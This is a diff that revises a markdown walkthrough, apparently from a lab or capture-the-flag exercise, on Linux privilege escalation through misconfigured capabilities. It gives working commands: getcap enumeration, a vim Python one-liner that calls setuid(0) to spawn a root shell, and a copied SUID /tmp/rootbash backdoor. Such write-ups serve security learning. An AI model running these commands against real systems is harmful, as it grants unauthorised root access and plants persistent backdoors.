@@ -1,17 +1,38 @@
 # 🔐 Privilege Escalation: Capabilities
 
-Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user
-* **the command used to find capabilities is:**
+Linux capabilities provide a more granular way of managing privileges compared to the traditional root/non-root permission model.
+
+For example, a SOC analyst may need to use a tool that requires socket connections. Instead of granting full root privileges, the administrator can assign specific capabilities to the binary, allowing it to perform privileged actions securely.
+
+Misconfigured capabilities can sometimes be abused for privilege escalation.
+
+---
+
+## 🔍 Finding Capabilities
+
+To search for binaries with special capabilities assigned, use:
+
 ```bash
 getcap -r / 2>/dev/null
 ```
+
 ![img](screenshots/capabilities/getcap_command.png)
 
-* **we see two bin we can use to get root privilege by "setuid" : vim , view**
+---
+## 📌 Discovered Binaries
 
-## exploit vim
+During enumeration, we found two interesting binaries:
 
-* **we use command :**
+- `vim`
+- `view`
+
+Both binaries have capabilities that allow privilege escalation through `setuid`.
+
+---
+
+## 🚀 Exploiting `vim`
+
+We used the following command to spawn a root shell:
 
 ```bash
 /home/karen/vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
@@ -19,13 +40,17 @@ getcap -r / 2>/dev/null
 
 ![img](screenshots/capabilities/command.png)
 
-* **then we will get the root shell**
+After execution, a root shell was obtained successfully.
 
 ![img](screenshots/capabilities/get_root_capa.png)
 
-other methods is 
+---
 
-* **upgrade our shell to root by command :**
+## 🔥 Alternative Method
+
+Another technique is to create a SUID-enabled bash binary.
+
+Run:
 
 ```bash
 /home/karen/vim -c ':py3 import os; os.setuid(0); os.system("cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash")'
@@ -33,9 +58,10 @@ other methods is
 
 ![img](screenshots/capabilities/other_command.png)
 
-* **then**
+Then execute:
 
 ```bash
 /tmp/rootbash -p
 ```
+
 ![img](screenshots/capabilities/get_root2.png)
